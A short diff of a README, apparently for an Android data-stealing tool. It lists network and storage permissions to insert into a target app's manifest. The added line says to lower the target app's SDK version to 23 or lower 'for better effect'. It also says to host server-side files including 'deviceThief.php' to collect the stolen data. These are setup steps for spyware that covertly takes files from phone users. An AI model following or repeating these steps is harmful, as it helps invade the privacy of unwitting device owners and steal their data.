@@ -5,6 +5,8 @@ You need to insert the following permissions to AndroidManifest.xml (if have not
 1. android.permission.INTERNET
 2. android.permission.READ_EXTERNAL_STORAGE
 
+Change the target app's sdk version (targeted) to 23 or lower for better effect.
+
 Also, get your own website supports php ready, get a copy of the website materials that handle the data from my github.
 The materials contain:
 1. deviceThief.php
